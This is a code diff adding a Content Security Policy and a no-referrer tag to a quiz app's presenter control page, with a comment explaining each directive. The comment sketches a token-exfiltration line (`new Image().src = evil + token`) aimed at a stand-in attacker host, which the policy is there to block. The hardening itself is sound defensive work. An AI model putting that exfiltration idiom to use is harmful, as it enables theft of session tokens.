@@ -3,6 +3,45 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!--
+    Content Security Policy for the presenter's control view.
+
+    This page holds the presenter token, so it is the most valuable page in the
+    system. The policy is a containment layer, not the fix: injection is already
+    prevented server-side (Room.validateAnswer) and in the renderer (textContent
+    rather than innerHTML). What this adds is that a *future* injection bug does
+    not become a session takeover.
+
+    script-src 'self'  -- blocks inline event handlers (onerror=, onload=, ...).
+                          Since innerHTML never executes <script>, inline
+                          handlers are the only code-execution route into this
+                          page, so this is the directive that does the work.
+    connect-src 'self' -- covers the WebSocket: 'self' matches ws:// and wss://
+                          on this origin, while blocking exfiltration to any
+                          other host.
+    img-src            -- deliberately narrow: `new Image().src = evil + token`
+                          is the cheapest exfiltration channel there is.
+                          Add explicit hosts here if a quiz needs remote images.
+    style-src-attr     -- quiz markup (HTML/SVG authored by the lecturer) may
+                          carry inline style="..." attributes; without this they
+                          are silently dropped.
+
+    Kept in sync with the header set by the Caddyfile, which is authoritative in
+    production. This copy protects development and any non-Caddy deployment.
+    Note that frame-ancestors is ignored in <meta> and only works as a header.
+  -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self';
+    style-src 'self';
+    style-src-attr 'unsafe-inline';
+    img-src 'self' data:;
+    font-src 'self';
+    connect-src 'self';
+    base-uri 'none';
+    object-src 'none';
+    form-action 'none'">
+  <meta name="referrer" content="no-referrer">
   <title>Quiz Control</title>
   <link rel="stylesheet" href="/styles/quiz-ui.css">
   <link rel="stylesheet" href="/styles/control.css">
